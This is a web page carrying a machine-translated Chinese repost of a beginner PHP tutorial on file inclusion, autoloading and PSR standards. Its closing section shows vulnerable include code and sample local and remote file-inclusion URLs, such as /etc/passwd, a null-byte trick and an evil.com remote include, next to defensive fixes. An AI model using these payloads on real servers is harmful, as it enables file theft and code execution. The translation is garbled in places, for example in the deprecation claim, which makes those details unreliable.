<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🔖 ▫️ 👨🏽 适用于初学者的PHP。 档案连线 😆 🙆🏿 👶🏻</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="在PHP for Beginners系列的后续文章中，今天的文章将重点介绍PHP如何搜索和连接文件。 

 为什么和为什么 
 PHP是一种脚本语言，最初是为快速雕刻主页而创建的（是的，是的，最初是个人个人年龄工具），后来开始在膝上创建商店，社交程序和其他工艺品，超出了预期的范围。 ，但是我为什么-...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>适用于初学者的PHP。 档案连线</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/439618/"><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/7f2/13e/83b/7f213e83b178b352cfdda06ff16a639f.png" alt="图片"></div><br><br> 在PHP for Beginners系列的后续文章中，今天的文章将重点介绍PHP如何搜索和连接文件。 <br><a name="habracut"></a><br><h3> 为什么和为什么 </h3><br>  PHP是一种脚本语言，最初是为快速雕刻主页而创建的（是的，是的，最初是个人个人年龄工具），后来开始在膝上创建商店，社交程序和其他工艺品，超出了预期的范围。 ，但是我为什么-编码的功能越多，对结构正确，消除代码重复，将其分成逻辑部分并仅在必要时进行连接的渴望就越大（这与您在你以前读过 位置，可以将其拆分成多个部分）。 为此，PHP具有多个功能，其一般含义是连接和解释指定的文件。 让我们看一个连接文件的例子： <br><br><pre><code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// file variable.php $a = 0; // file increment.php $a++; // file index.php include ('variable.php'); include ('increment.php'); include ('increment.php'); echo $a;</span></span></code> </pre> <br> 如果运行<em>index.php</em>脚本，则PHP将依次连接并执行所有这些操作： <br><br><pre> <code class="php hljs">$a = <span class="hljs-number"><span class="hljs-number">0</span></span>; $a++; $a++; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a; <span class="hljs-comment"><span class="hljs-comment">//  2</span></span></code> </pre><br> 连接文件时，其代码与连接所在行的作用域相同，因此此行中可用的所有变量将在包含的文件中可用。 如果在包含文件中声明了类或函数，则它们属于全局范围（除非为它们指定了名称空间）。 <br><br> 如果在函数内部连接文件，则包含的文件可以访问函数的作用域，因此以下代码也将起作用： <br><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $a = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> (<span class="hljs-string"><span class="hljs-string">'increment.php'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> (<span class="hljs-string"><span class="hljs-string">'increment.php'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a; } a(); <span class="hljs-comment"><span class="hljs-comment">//  2</span></span></code> </pre><br><blockquote> 另外，我注意到<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">魔术常量</a> ： <code>__DIR__</code> ， <code>__FILE__</code> <code>__DIR__</code> ， <code>__FILE__</code> <code>__DIR__</code>和其他<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">常量</a> -它们与上下文相关，并在包含发生之前执行 </blockquote> 连接文件的独特之处在于，在连接文件时，解析会切换到HTML模式，因此，所包含文件中的任何代码都必须用PHP标记括起来： <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">//   // ... // </span><span class="hljs-meta"><span class="hljs-comment"><span class="hljs-meta">?&gt;</span></span></span></span></code> </pre><br> 如果文件中仅包含PHP代码，则习惯上省略结束标记，以免意外地在结束标记之后忘记任何字符线程，这充满了问题（我将在下一篇文章中讨论）。 <br><blockquote> 您是否看到包含10,000行的站点文件？ 我的眼泪已经s（╥_╥）... </blockquote><h3> 文件连接功能 </h3><br> 如上所述，在PHP中，有几个用于连接文件的函数： <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">include-</a>包含并执行指定的文件（如果找不到）-会发出警报<code>E_WARNING</code> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">include_once-</a>与上面的函数相似，但是一次包含文件 </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">require-</a>包含并执行指定的文件（如果找不到）-给出致命错误<code>E_ERROR</code> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">require_once-</a>与上面的函数类似，但是一次包含文件 </li></ul><br><blockquote> 实际上，这些功能不完全是函数，它们是特殊的语言构造，可以省略括号。 除其他事项外，还有其他方法可以连接和执行文件，但您可以自己进行挖掘，让它成为您的“带有星号的任务”；） </blockquote> 让我们以<code>require</code>和<code>require_once</code>之间的差异为例，获取一个<em>echo.php</em>文件： <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br> 我们将连接几次： <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">//     //  1 require_once 'echo.php'; //    , ..   //  true require_once 'echo.php'; //     //  1 require 'echo.php';</span></span></code> </pre><br> 执行的结果将是与<em>echo.php</em>文件的两个连接： <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br> 还有其他一些会影响连接的指令，但您将不需要它们<a href="">-auto_prepend_file</a>和<a href="">auto_append_file</a> 。 这些伪指令允许您分别在连接所有文件之前和执行所有脚本之后安装将要连接的文件。 当可能需要时，我什至无法提出“实时”方案。 <br><br><div class="spoiler">  <b class="spoiler_title">工作任务</b> <div class="spoiler_text"> 您可以使用<code>auto_prepend_file</code>和<code>auto_append_file</code>提出并实现脚本，只能在<em>php.ini</em> ， <em>.htaccess</em>或<em>httpd.conf中进行</em>更改（请参见<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">PHP_INI_PERDIR</a> ）：） <br></div></div><br><h3> 在哪里看？ </h3><br>  PHP在<a href="">include_path</a>指令指定的目录中搜索包含文件。 此伪指令还会影响<code>fopen()</code> ， <code>file()</code> ， <code>readfile()</code>和<code>file_get_contents()</code> 。 该算法非常简单-在搜索文件时，PHP会轮流检查<code>include_path</code>每个目录，直到找到要连接的文件为止；否则，它会返回错误。 要从脚本更改<code>include_path</code> ，请使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">set_include_path（）</a>函数。 <br><br> 设置<code>include_path</code>时，需要考虑一件事-在Windows和Linux上将不同的字符用作路径分隔符-“;” 和“：”，因此在指定目录时，请使用<code>PATH_SEPARATOR</code>常量，例如： <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//    linux $path = '/home/dev/library'; //    windows $path = 'c:\Users\Dev\Library'; //  linux  windows   include_path  set_include_path(get_include_path() . PATH_SEPARATOR . $path);</span></span></code> </pre><br> 在ini文件中编写<code>include_path</code>时，可以使用<code>${USER}</code>类的环境变量： <br><br> <code>include_path = ".:${USER}/my-php-library" <br></code> <br><br> 如果在连接文件时包括绝对路径（以“ /”开头）或相对路径（以“。”或“ ..”开头），则<code>include_path</code>指令将被忽略，并且仅在指定路径上执行搜索。 <br><blockquote> 也许值得一提谈论<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">safe_mode</a> ，但这已经是一个故事了（从5.4版开始），我希望您不会遇到它，但是如果突然发现它是什么，但是它过去了... </blockquote><h3> 使用退货 </h3><br> 我将告诉您一个小小的生活-如果包含的文件使用<code>return</code>构造返回了某些内容，则可以获取并使用此数据，因此您可以轻松地组织配置文件的连接，下面给出一个示例说明： <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [ <span class="hljs-string"><span class="hljs-string">'host'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'localhost'</span></span>, <span class="hljs-string"><span class="hljs-string">'user'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'root'</span></span>, <span class="hljs-string"><span class="hljs-string">'pass'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">''</span></span> ];</code> </pre><br><pre> <code class="php hljs">$dbConfig = <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'config/db.php'</span></span>; var_dump($dbConfig); <span class="hljs-comment"><span class="hljs-comment">/* array( 'host' =&gt; 'localhost', 'user' =&gt; 'root', 'pass' =&gt; '' ) */</span></span></code> </pre><br><blockquote> 有趣的事实，没有它也很好：如果在包含的文件中定义了函数，则可以在主文件中使用它们，而不管它们是在返回之前还是之后声明的 </blockquote><div class="spoiler">  <b class="spoiler_title">工作任务</b> <div class="spoiler_text"> 编写将从多个文件夹和文件收集配置的代码。 文件结构如下： <br><br><pre> <code class="plaintext hljs">config |-- default | |-- db.php | |-- debug.php | |-- language.php | `-- template.php |-- development | `-- db.php `-- production |-- db.php `-- language.php</code> </pre><br> 在这种情况下，代码应按以下方式工作： <br><br><ul><li> 如果系统环境中有一个<code>PROJECT_PHP_SERVER</code>变量，并且它等于<code>development</code> ，则应连接<em>默认</em>文件夹中的所有文件，应将数据包含在<code>$config</code>变量中，然后应将<em>开发</em>文件夹中的文件连接起来，并且接收到的数据应研磨存储在<code>$config</code>的相应项目 </li><li> 如果<code>PROJECT_PHP_SERVER</code>是<code>production</code>则类似的行为（自然仅适用于<em>生产</em>文件夹） </li><li> 如果没有变量，或者设置不正确，则仅连接<em>默认</em>文件夹中的文件 </li></ul><br></div></div><br><h3> 自动连接 </h3><br> 带有文件附件的构造看起来非常庞大，并且也遵循它们的更新-另外一件礼物，请从示例<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">文章中查看有关异常</a>的一段代码： <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// load all files w/out autoloader require_once 'Education/Command/AbstractCommand.php'; require_once 'Education/CommandManager.php'; require_once 'Education/Exception/EducationException.php'; require_once 'Education/Exception/CommandManagerException.php'; require_once 'Education/Exception/IllegalCommandException.php'; require_once 'Education/RequestHelper.php'; require_once 'Education/Front.php';</span></span></code> </pre><br> 避免这种“幸福”的第一个尝试是<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">__autoload</a>函数的出现。 更确切地说，它甚至不是特定的功能，您必须自己定义此功能，并需要用它来连接类名所需的文件。 唯一的规则是， <strong>对于每个类，应使用该类的名称创建一个单独的文件</strong> （即， <i>myClass</i>应该位于<i>myClass.php</i>文件中）。 这是实现此功能<code>__autoload()</code>的示例（摘自官方手册中的注释）： <br><br> 我们将连接的类： <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//  myClass    myClass.php class myClass { public function __construct() { echo "myClass init'ed successfuly!!!"; } }</span></span></code> </pre><br> 连接此类的文件： <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//   //     include_path function __autoload($classname) { $filename = $classname .".php"; include_once $filename; } //   $obj = new myClass();</span></span></code> </pre><br> 现在，关于此函数的问题-设想一种情况，您正在连接第三方代码，并且有人已经为您的代码注册了<code>__autoload()</code>函数，瞧！ <br><br><pre> <code class="php hljs">Fatal error: Cannot redeclare __autoload()</code> </pre><br> 为了避免这种情况，我们创建了一个函数，该函数允许您将任意函数或方法注册为类加载器<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">-spl_autoload_register</a> 。 即 我们可以创建几个具有任意名称的函数来加载类，然后使用<code>spl_autoload_register</code>注册。 现在<code>index.php</code>将如下所示： <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//   //     include_path function myAutoload($classname) { $filename = $classname .".php"; include_once($filename); } //   spl_autoload_register('myAutoload'); //   $obj = new myClass();</span></span></code> </pre><br><blockquote> 标题“您知道吗？”：第一个参数<code>spl_autoload_register()</code>是可选的，如果不带此参数调用该函数，则将函数<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">spl_autoload</a>用作加载程序，将在<code>include_path</code>文件夹以及扩展名为<code>.php</code>和<code>.inc</code>文件中进行搜索，但这可以使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">spl_autoload_extensions</a>函数扩展该列表 </blockquote> 现在，每个开发人员都可以注册他的加载器，主要是类名不匹配，但是如果使用名称空间，这应该不是问题。 <br><blockquote> 由于<code>spl_autoload_register()</code>这样的高级功能已经存在很长时间了，因此<code>spl_autoload_register()</code>函数<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">在PHP 7.1中</a>已经声明为<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">已弃用</a> ，这意味着在可预见的将来，此函数将被完全删除（X_x） </blockquote> 好吧，或多或少地清除了画面，尽管嘿，所有注册的引导加载程序在注册时都会分别排队，如果有人欺骗了他进入他的引导加载程序，则会出现一个非常令人讨厌的错误，而不是预期的结果。 为避免这种情况，成人聪明人介绍了一种标准，该标准使您可以毫无问题地连接第三方库，主要是它们中的类组织符合<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">PSR-0</a>标准（已经有10年的历史了）或<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">PSR-4</a> 。 标准中描述的要求的实质是什么： <br><br><ol><li> 每个库必须位于其自己的名称空间（所谓的供应商名称空间）中 </li><li> 每个名称空间必须具有自己的文件夹。 </li><li> 在命名空间内可能有子空间-也在单独的文件夹中 </li><li> 一类-一文件 </li><li> 扩展名为<code>.php</code>的文件名必须与类名完全匹配 </li></ol><br> 手册中的示例： <br><table><tbody><tr><th> 全班名 </th><th> 命名空间 </th><th> 基本目录 </th><th> 全程 </th></tr></tbody><tbody><tr><td>  \ Acme \日志\ Writer \ File_Writer </td><td>  Acme \ Log \ Writer </td><td>  ./acme-log-writer/lib/ </td><td>  ./acme-log-writer/lib/File_Writer.php </td></tr><tr><td>  \光环\网络\响应\状态 </td><td> 光环\ Web </td><td>  /路径/到/ aura-web / src / </td><td>  /path/to/aura-web/src/Response/Status.php </td></tr><tr><td>  \ Symfony \核心\请求 </td><td>  Symfony \核心 </td><td>  ./供应商/ Symfony / Core / </td><td>  ./vendor/Symfony/Core/Request.php </td></tr><tr><td>  \ Zend \ Acl </td><td> 曾德 </td><td>  / usr / includes / Zend / </td><td>  /usr/includes/Zend/Acl.php </td></tr></tbody></table><br><br> 这两个标准之间的区别在于PSR-0支持没有命名空间的旧代码（即版本5.3.0之前的版本），PSR-4不受这种过时的困扰，甚至避免了不必要的文件夹嵌套。 <br><br> 由于这些标准，有可能出现诸如<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">作曲家</a>之类的工具<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">-PHP</a>的通用软件包管理器。 如果有人错过了，那么<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" class="user_link">pronskiy会提供</a>有关此工具的好报告。 <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/cpdJR0D8ZV8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h3>  Php注射 </h3><br> 我还想谈一谈在一个<code>index.php</code>为该站点创建一个单一入口点并将其称为MVC框架的每个人的第一个错误： <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!is_file($page)) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page;</code> </pre><br> 您看一下代码，只想在其中传输恶意代码： <br><br><pre> <code class="bash hljs">//     http://domain.com/index.php?page=../index.php //      http://domain.com/index.php?page=config.ini //    http://domain.com/index.php?page=/etc/passwd //  ,       http://domain.com/index.php?page=user/backdoor.php</code> </pre><br> 首先想到的是强制添加<code>.php</code>扩展名，但在某些情况下，可以“感谢” <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">零字节漏洞</a> （请阅读此漏洞<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">已修复</a>了<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">很长时间</a> ，但是突然之间您遇到了比PHP 5.3更早的解释器，一般开发也建议）： <br><br><pre> <code class="bash hljs">//    http://domain.com/index.php?page=/etc/passwd%00</code> </pre><br><blockquote> 在现代版本的PHP中，连接文件路径中零字节字符的存在会立即导致相应的连接错误，即使指定的文件存在并且可以连接，结果也始终是错误的，它按以下方式检查<code>strlen(Z_STRVAL_P(inc_filename)) != Z_STRLEN_P(inc_filename)</code> （来自PHP本身） </blockquote> 第二个“有价值”的想法是检查当前目录中的文件： <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos(realpath($page), <span class="hljs-keyword"><span class="hljs-keyword">__DIR__</span></span>) !== <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong path to file'</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page . <span class="hljs-string"><span class="hljs-string">'.php'</span></span>;</code> </pre><br> 该检查的第三个但不是最后一个修改是使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">open_basedir</a>指令，借助它的帮助，您可以指定确切的PHP将在其中搜索要连接的文件的目录： <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); ini_set(<span class="hljs-string"><span class="hljs-string">'open_basedir'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">__DIR__</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page . <span class="hljs-string"><span class="hljs-string">'.php'</span></span>;</code> </pre><br><blockquote> 请注意，此指令不仅会影响文件的连接，还会影响文件系统的所有工作，即 包括此限制在内，您必须确保没有忘记指定目录之外的任何内容，缓存数据或任何用户文件（尽管功能<code>is_uploaded_file()</code>和<code>move_uploaded_file()</code>继续与用于下载文件的临时文件夹一起使用）。 </blockquote> 还有哪些其他检查？ 有很多选择，这完全取决于您的应用程序的体系结构。 <br><br> 我还想回想一下存在一个“很棒的” <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">allow_url_include</a>指令（它取决于<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">allow_url_fopen</a> ），它允许您连接和执行远程PHP文件，这对于您的服务器而言更加危险： <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//   PHP  http://domain.com/index.php?page=http://evil.com/index.php</span></span></code> </pre><br> 看到，记住并且从不使用，默认情况下关闭了好处。 您将需要比以前更少的功能；在所有其他情况下，请奠定正确的应用程序体系结构，使应用程序的各个部分通过API进行通信。 <br><br><div class="spoiler">  <b class="spoiler_title">工作任务</b> <div class="spoiler_text"> 编写一个脚本，使您可以按名称连接当前文件夹中的php脚本，同时记住可能存在的漏洞并避免遗漏。 <br></div></div><br><h3> 总结 </h3><br> 本文是PHP的基础，因此请仔细研究，完成任务并且不要归档，没有人会教您。 <br><br><h3> 聚苯乙烯 </h3><br> 这是一系列文章“面向初学者的PHP”的转贴： <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">会议</a> </li><li>  <b>档案连线</b> </li></ul><br> 如果您对文章的材料或形式有任何评论，请在评论中描述要点，我们将使材料变得更好。 </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN439618/">https://habr.com/ru/post/zh-CN439618/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN439608/index.html">现代宗教：Google，Facebook，Amazon和Apple给人们什么？</a></li>
<li><a href="../zh-CN439610/index.html">就像在我的雪佛兰Bolt电动汽车中一样，在保修期内，更换了两个电池模块，第三个在监视中</a></li>
<li><a href="../zh-CN439612/index.html">强大的JavaScript：追逐神话</a></li>
<li><a href="../zh-CN439614/index.html">如何区分好的修复与坏的修复，或者我们在SRG中如何通过Tomit解析器创建多线程Java库</a></li>
<li><a href="../zh-CN439616/index.html">Kickstarter第七期有趣的IT项目摘要</a></li>
<li><a href="../zh-CN439620/index.html">了解JavaScript中的异步[Sukhjinder Arora的翻译]</a></li>
<li><a href="../zh-CN439624/index.html">为什么要在轨道上存储数据</a></li>
<li><a href="../zh-CN439626/index.html">有为OpenNumismat收集器开发免费应用程序的经验</a></li>
<li><a href="../zh-CN439628/index.html">ASP.NET Web API中的并行数据刷新</a></li>
<li><a href="../zh-CN439632/index.html">如何为您的项目设置持续部署：个人经验</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>